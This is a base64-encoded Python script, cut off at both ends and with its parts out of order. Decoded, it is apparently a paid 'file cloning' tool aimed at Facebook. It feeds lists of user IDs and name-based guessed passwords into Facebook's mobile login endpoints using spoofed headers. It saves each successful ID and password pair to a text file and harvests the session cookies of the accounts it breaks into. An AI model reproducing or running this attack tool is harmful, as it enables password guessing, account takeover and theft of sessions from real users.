iAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJ1xuIFNlbGVjdCBWYWxpZCBPbmUnKQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKZGVmIGJuc2J1eSgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAobG9nbykKICAgIGZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZQogICAgcHJpbnQoJ1x0Q2hlY2tpbmcgRm9yIFN1YnNjcmlwdGlvbi4uLlxuJykKICAgIHRyeToKICAgICAgICBmID0gKGIneFx4OWNceGQzT0ksSVx4ZDRceDA3XHgxM1x4YzlceGY5XHhiOXolXHhhOUVceGI5XHhhNVx4MTVceGZhaVx4OTk5XHhhOVx4YzVceGZhXHhhNVx4YzVFXHhmYVx4YTklXHhjOVx4ZmFceDEwXHhjMVx4YTRceGNjPFx4MDB9XHgxZVx4MTFceDE3JykKICAgICAgICBiZCA9ICh6bGliLmRlY29tcHJlc3MoZikpCiAgICAgICAgdG8gPSAob3BlbihiZCwgJ3InKS5yZWFkKCkpCiAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICBibnNyZWcoKQogICAgdHJ5OgogICAgICAgIGJ0ID0gKGIneFx4OWNceGNiKCkpKFx4YjZceGQyXHhkNy9KLFx4ZDdLXHhjZixceGM5KE0qLU4tSlx4Y2VceGNmK0lceGNkK1x4ZDFLXHhjZVx4Y2ZceGQ1NzEwXHhkMVx4ZjVceGNiL1x4ZDF1d1xyXHhkMS9ceGQ2XHhjZk1ceGNjXHhjY1x4ZDNPXHgwNFx4MDAmIVx4MTMmJykKICAgICAgICBidyA9ICh6bGliLmRlY29tcHJlc3MoYnQpKQogICAgICAgIHIgPSAocmVxdWVzdHMuZ2V0KGJ3KS50ZXh0KQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgIHByaW50ICgiXHgxYlswOzM3bU5vIEludGVybmV0IENvbm5lY3Rpb24iKQogICAgICAgIGV4aXQoKQoKICAgIGlmIHRvIGluIHI6CiAgICAgICAgZnVjay5hcHBlbmQoMSkKICAgICAgICBzYXJmcmF6KCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgKGxvZ28pCiAgICAgICAgcHJpbnQgKCdceDFiWzE7OTdtXHJZb3VyIFRva2VuIElzIE5vdCBTdWJzY3JpYmVkXG4nKQogICAgICAgIHByaW50CiAgICAgICAgcHJpbnQKICAgICAgICBwcmludCAoJ1xyXHgxYlsxOzk3bSBZb3VyIFRva2VuIDogJyArIHRvICsgJ1xuJykKICAgICAgICBwcmludAogICAgICAgIHByaW50KCdcclRvb2wgUHJpY2UgMjAwVGtcbicpCiAgICAgICAgcHJpbnQKICAgICAgICBwcmludCgnXFdoYXRzYXBwIEFjY291bnQgTnVtYmVyIDAxNzczMTQ3NzE0XG4nKQogICAgICAgIHByaW50KCdcckFjY291bnQgTmFtZSBTb3VtaWsgQWhtZWRcbicpCiAgICAgICAgcHJpbnQKICAgICAgICBwcmludAogICAgICAgIHByaW50KCdcclBheW1lbnQgU3VjY2Vzc2Z1bGx5IE1zZyBPciBUb2tlbiBTZW5kXG4nKQogICAgICAgIHByaW50CiAgICAgICAgcHJpbnQKICAgICAgICBzYiA9IGlucHV0KCdcclBhc3RlIEhlcmUgUGF5bWVudCBTdWNjZXNzZnVsbHkgTXNnOicpCiAgICAgICAgcHJpbnQgKCdcbicpCiAgICAgICAgc3MgPSBpbnB1dCgnXHJQYXN0ZSBIZXJlIHlvdXIgVG9rZW46JykKICAgICAgICBwcmludCgnXG4nKQogICAgICAgIHByaW50KCdccllvdXIgUmVxdWVzdCBTdWJtaXR0ZWQgUGxlYXNlIHdhaXQgICcpCiAgICAgICAgdGtzID0gJ0hlbGxvJTIwQWRtaW4lMjBBcHByb3ZhbCUyMG15JTIwa2V5LiUyMHBheW1lbnQlMjBEb25lLCUyMCUyMEluZm9ybWF0aW9uJTIwOi0lMjAlMjAlMjBUcmFjayUyME1zZyUyMDolMjAlMjAnK3NiKyclMjBUb2tlbiUyMDolMjAnK3NzCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys5MjMyMDY2MjAyNjk/dGV4dD0nICsgdGtzKQoKZGVmIGJuc3JlZygpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAobG9nbykKICAgIHByaW50ICgnXHgxYlsxOzk3bVx0WW91ciBUb2tlbiBJcyBOb3QgU3Vic2NyaWJlZFxuJykKICAgIHByaW50CiAgICBpZCA9IHN0cih1dWlkLnV1aWQxKHV1aWQuZ2V0bm9kZSgpLDApKVsyNDpdLnVwcGVyKCkgKyAiflNBUz09IgogICAgcHJpbnQKICAgIHByaW50ICgnXG5ceDFiWzE7OTdtIFlvdXIgVG9rZW46IFx4MWJbOTdtJyArIGlkICsgJ1xuJykKICAgIHByaW50CiAgICBwcmludCgnXHJUb29sIFByaWNlIDIwMFRLXG4nKQogICAgcHJpbnQKICAgIHByaW50KCdcV2hhdHNhcHAgQWNjb3VudCBOdW1iZXIgMDE3NzMxNDc3MTRcbicpCiAgICBwcmludCgnXHJBY2NvdW50IE5hbWUgU09VTUlLIEFITUVEXG4nKQogICAgcHJpbnQKICAgIHByaW50KCdcclBheW1lbnQgU3VjY2Vzc2Z1bGx5IE1zZyBPciBUb2tlbiBTZW5kXG4nKQogICAgcHJpbnQKICAgIHNiID0gaW5wdXQoJ1xyUGFzdGUgSGVyZSBQYXltZW50IFN1Y2Nlc3NmdWxseSBNc2c6JykKICAgIHByaW50ICgnXG4nKQogICAgc3MgPSBpbnB1dCgnXHJQYXN0ZSBIZXJlIHlvdXIgVG9rZW46JykKICAgIHByaW50ICgnXG4nKQogICAgcHJpbnQoJ1lvdXIgUmVxdWVzdCBTdWJtaXR0ZWQgUGxlYXNlIHdhaXQgICcpCiAgICB0a3MgPSAnSGVsbG8lMjBBZG1pbiUyMEFwcHJvdmFsJTIwbXklMjBrZXkuJTIwcGF5bWVudCUyMERvbmUsJTIwJTIwSW5mb3JtYXRpb24lMjA6LSUyMCUyMCUyMFRyYWNrJTIwTXNnJTIwOiUyMCUyMCcrc2IrJyUyMFRva2VuJTIwOiUyMCcrc3MKICAgIG9zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rOTIzMjA2NjIwMjY5P3RleHQ9JyArIHRrcykKICAgIGYgPSAoYid4XHg5Y1x4ZDNPSSxJXHhkNFx4MDdceDEzXHhjOVx4ZjlceGI5eiVceGE5RVx4YjlceGE1XHgxNVx4ZmFpXHg5OTlceGE5XHhjNVx4ZmFceGE1XHhjNUVceGZhXHhhOSVceGM5XHhmYVx4MTBceGMxXHhhNFx4Y2M8XHgwMH1ceDFlXHgxMVx4MTcnKQogICAgYmQgPSAoemxpYi5kZWNvbXByZXNzKGYpKQogICAgc2F2ID0gb3BlbihiZCwgJ3cnKSAKICAgIHNhdi53cml0ZShpZCkKICAgIHNhdi5jbG9zZSgpCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHRpbWUuc2xlZXAoMykKICAgIGV4aXQoKQpjbGFzcyBsb2FkOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIF8gPSAnJwogICAgICAgIF9fID0gaW50KCczMCcpCiAgICAgICAgX19fID0gaW50KCcwJykKICAgICAgICBfXyAtPSAxCiAgICAgICAgX19fICs9IDEKICAgICAgICBmb3IgdCBpbiByYW5nZShpbnQoIjEiKSk6CiAgICAgICAgICAgIHByaW50KCdcciBQbGVhc2UgV2FpdCAuLi4uJykKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQogICAgICAgIHByaW50KCdcbicpCgpzYXJmcmF6KCkKnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyByZXF1ZXN0cyAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cycpCgp0cnk6CiAgICBpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGZ1dHVyZXMgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlcycpCgp0cnk6CiAgICBpbXBvcnQgYnM0CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQoKaW1wb3J0IHJlcXVlc3RzLCBvcywgcmUsIGJzNCxwbGF0Zm9ybSwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCB0aHJlYWRpbmcsIGl0ZXJ0b29scyxiYXNlNjQsdXVpZCx6bGliCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgc2FyZnJhenNzYgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cAoKCmN0ID0gZGF0ZXRpbWUubm93KCkKbiA9IGN0Lm1vbnRoCmJ1bGFuID0gWydKYW51YXJ5JywgJ0ZlYnJ1YXJ5JywgJ01hcmNoJywgJ0FwcmlsJywgJ01heScsICdKdW5lJywgJ0p1bHknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2N0b2JlcicsICdOb3ZlbWJlcicsICdEZWNlbWJlciddCnRyeToKICAgIGlmIG4gPCAwIG9yIG4gPiAxMjoKICAgICAgICBleGl0KCkKICAgIG5UZW1wID0gbiAtIDEKZXhjZXB0IFZhbHVlRXJyb3I6CiAgICBleGl0KCkKCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQpvcCA9IGJ1bGFuW25UZW1wXQpQID0gJ1x4MWJbMTs5N20nICMgCk0gPSAnXDAzM1sxOzMxbScgIyAKSCA9ICdcMDMzWzE7MzJtJyAjIApLID0gJ1x4MWJbMTs5N20nICMgCkIgPSAnXHgxYlsxOzk3bScgIyAKVSA9ICdceDFiWzE7OTdtJyAjIApPID0gJ1x4MWJbMTs5N20nICMgCk4gPSAnXHgxYlswbScgICAgIyAKbXlfY29sb3IgPSBbCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpCmRhdGEsZGF0YTI9e30se30KYW1hbixjcCxzYWxhaD0wLDAsMAp1YmFoUCxmdWNrLHB3QmFydT1bXSxbXSxbXQpvayA9IFtdCmNwID0gW10KaWQgPSBbXQp1c2VyID0gW10KbG9vcCA9IDAKdXJsX2xvb2t1cCA9ICJodHRwczovL2xvb2t1cC1pZC5jb20vIgp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIKdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIgpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10ifQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9CmRvbmUgPSBGYWxzZQoKZGVmIGphbGFuKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKCmxvZ28gPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIgICAKCgrigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXimIXimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXigJQK4piFCuKYheKWkeKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl+KYheKWiOKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlwrimIXilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilZHilpHilpHilpHilojilojilZHimIXilojilojilojilojilZfilpHilojilojilojilojilZHilojilojilZHilojilojilZHilpHilojilojilZTilZ0K4piF4pWa4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4piF4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4pWQ4pWd4paRCuKYheKWkeKVmuKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKYheKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKWiOKWiOKVl+KWkQrimIXilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3imIXilojilojilZHilpHilZrilZDilZ3ilpHilojilojilZHilojilojilZHilojilojilZHilpHilZrilojilojilZcK4piF4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4piF4pWa4pWQ4pWd4paR4paR4paR4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWdCuKYhQrimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXimIXimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJQKIAogICAKXDAzM1swOzkzbeKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYhSDimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIUKXDAzM1swOzkxbUFVVEhPUiA6IDogU09VTUlLCiAKXDAzM1swOzkzbUZBQ0VCT09LIDogOiBzb3VtaWs5NTYKIApcMDMzWzA7OTZtR0lUSFVCIDogOiBTQVMtMDA3CiAKXDAzM1swOzk1bVRPT0xTICAgOiA6IEZJTEUgQ0xPTklORyAob25seSkKXDAzM1swOzk2beKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYhSDimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIUiIiIgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgpkZWYgaGFzaWwoT0ssY3ApOgoJaWYgbm90IGxlbihPSykgIT0gMDoKCSAgICBwYXNzCglpZiBsZW4oY3ApICE9IDA6CgkgICAgcHJpbnQoJ1xuXG4gXHgxYlsxOzkybVRPVEFMIE9LIDogXHgxYlsxOzkybSAlcyAgXHgxYlsxOzkybVNPVU1JS19PSy50eHQnICUgKEgsIFAsIHN0cihsZW4ob2spKSkpCgkgICAgcHJpbnQoJyBceDFiWzE7OTFtVE9UQUwgQ1AgOlx4MWJbMTs5MW0gICAlcyBceDFiWzE7OTFtU09VTUlLX0NQLnR4dCcgJSAoSCwgUCwgc3RyKGxlbihjcCkpKSkKCSAgICBpbnB1dCgiXHgxYlsxOzkybVBSRVNTIEVOVEVSIFRPIEJBQ0sgTUVOVSAiKQoJICAgIHNhcmZyYXooKQoKZGVmIHNhcmZyYXooKToKCgoKCiAgICAgICAgCiAgCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBpcG0gPSByZXF1ZXN0cy5nZXQodXJsX2lwKS5qc29uKCkKICAgIHRvZHogPSAnJwogICAgSVAgPSBpcG1bJ29yaWdpbiddCiAgICBwcmludAogICAgcHJpbnQoJyBbMV0gU1RBUlQgRklMRSBDTE9OSU5HJykKICAgIHByaW50KCcgWzNdIEVYSVQgJykKICAgIHByaW50KCcnKQogICAgX3NhcmZyYXpfX18gPSBpbnB1dCgnIFs/XSBDSE9PU0UgT1BUSU9OIDogJykKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMScsICcwMScpOgogICAgICAgIF9feHh4X18oKS5zYXJmcmF6eChpZCkKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMicsICcwMicpOgogICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIGRtLnB5JykKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMycsICcwMycpOgogICAgICAgIHBhc3MKCgpjbGFzcyBfX3h4eF9fOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuaWQgPSBbXQogICAgZGVmIHNhcmZyYXp4KHNlbGYsaWQpOgogIAogICAgICAgCiAgICAgIAogICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAKCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgcHJpbnQobG9nbykKICAgICAgICBzZWxmLmNudCA9IGlucHV0KCdQVVQgRklMRSBOQU1FIDogJykKICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgX19fd29ybGR3aWRlX19fID0gKCd5JykKICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ0hPT1NFIENPUlJFQ1QgT05FJyk7CiAgICAgICAgICAgIHNlbGYuc2FyZnJhengoaWQpCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6CiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3AKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJceDFiWzE7OTJtW1NvdW1pa10ge2xvb3B9fHtsZW4oc2VsZi5pZCl9IFtva11be2xlbihvayl9XSBbY3BdW3tsZW4oY3ApfV0gIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOgogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgaGVhZGVyID0gewogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICBkYXMgPSB7CiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgICAgICAgICAidWlkIjp1c2VyLAogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwKICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7CiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLAogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJvcmlnaW4iOiJodHRwczovLyIrY2Vib2ssCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLAogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH1bU291bWlrLU9LXSB7dXNlcn0gfCB7cHd9IikKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICBvcGVuKCdTb3VtaWtfT0sudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gc2Vzc2